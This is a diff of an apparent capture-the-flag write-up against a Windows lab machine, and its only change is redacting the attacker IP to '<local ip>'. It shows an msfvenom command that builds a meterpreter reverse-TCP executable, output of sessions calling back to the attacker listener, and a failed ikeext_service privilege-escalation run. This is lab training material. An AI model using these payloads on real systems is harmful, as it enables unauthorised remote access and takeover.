@@ -121,12 +121,12 @@ pic4.png - a bummer there is an issue with the default browser entry... lets try
 Meh, still nothing, I am going to try Metasploits exploit Suggester to see anything else...
 Lets create a meterpreter shell exe and put it on the victim via simple.http server ...
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.9.96 LPORT=4447 -f exe > shell.exe
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local ip> LPORT=4447 -f exe > shell.exe
 ```
 ```
-[*] Started reverse TCP handler on 10.9.9.96:4447 
+[*] Started reverse TCP handler on <local ip>:4447 
 [*] Sending stage (176195 bytes) to 10.10.121.250
-[*] Meterpreter session 1 opened (10.9.9.96:4447 -> 10.10.121.250:50636) at 2020-06-25 14:59:35 +0300
+[*] Meterpreter session 1 opened (<local ip>:4447 -> 10.10.121.250:50636) at 2020-06-25 14:59:35 +0300
 
 meterpreter > getuid
 Server username: RETROWEB\Wade
@@ -162,7 +162,7 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.9.9.96        yes       The listen address (an interface may be specified)
+   LHOST     <local ip>        yes       The listen address (an interface may be specified)
    LPORT     4447             yes       The listen port
 
 
@@ -174,14 +174,14 @@ Exploit target:
 
 
 msf5 exploit(windows/local/ikeext_service) > run
-[*] Started reverse TCP handler on 10.9.9.96:4447 
+[*] Started reverse TCP handler on <local ip>:4447 
 [*] Checking service exists...
 [!] UAC is enabled, may get false negatives on writable folders.
 [*] Checking %PATH% folders for write access...
 [*] Sending stage (201283 bytes) to 10.10.121.250
 [*] Path C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps does not exist...
 [*] Path  does not exist...
-[*] Meterpreter session 2 opened (10.9.9.96:4447 -> 10.10.121.250:51135) at 2020-06-25 15:20:41 +0300 
+[*] Meterpreter session 2 opened (<local ip>:4447 -> 10.10.121.250:51135) at 2020-06-25 15:20:41 +0300 
 [*] Attempting to create a non-existant PATH dir to use.
 [-] Exploit aborted due to failure: not-vulnerable: Unable to write to any folders in the PATH, aborting...
 [*] Exploit completed, but no session was created.
